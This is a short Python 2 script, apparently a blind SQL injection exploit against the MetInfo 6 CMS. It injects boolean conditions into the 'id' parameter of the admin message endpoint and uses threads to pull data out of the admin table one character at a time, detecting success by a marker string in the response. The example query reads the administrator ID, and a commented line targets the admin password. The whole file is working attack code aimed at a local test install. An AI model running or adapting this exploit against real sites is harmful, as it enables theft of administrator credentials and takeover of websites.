# coding: utf-8

import requests
import re
import sys
import threading
class MetinfoSql(object):

    def __init__(self,url,sql):
        self.url=url
        self.sql=sql
        self.tmp=""
        self.run()
    def dataCount(self):
        payload="{0}/admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=42 and(length(({1}))={2})"
        i=0
        while True:
            url=payload.format(self.url,self.sql,i)
            try:
                #print(url)
                response=requests.get(url)
            except:
                continue
            #print(response.content)
            if("验证码" in response.content):
                print("data count is: %d" % (i))
                return i
            else:
                i=i+1
                continue
    def getData(self,curr,asc):
        payload="{0}/admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=42 and(ascii(substr(({1}),{2},1)))={3}"
        url=payload.format(self.url,self.sql,curr,asc)
        #print len(threading.enumerate())
        try:
            #print(url)
            response=requests.get(url)
        except:
            pass
        if "验证码" in response.content:
            self.tmp=self.tmp+chr(asc)
            print self.tmp
    def run(self):
        threadList=[]
        for i in range(1,int(self.dataCount())+1):
        #for i in range(1,15):
            for x in range(48,123):
                threadList.append(threading.Thread(target=self.getData,args=(i,x)))
        for t in threadList:
            t.start()
            while True:
                if(len(threading.enumerate())<50):
                    break



        
MetinfoSql('http://127.0.0.1/metinfo6/','select admin_id from met_admin_table limit 0,1')
#select admin_id from met_admin_table limit 1
#select admin_pass from met_admin_table limit 1
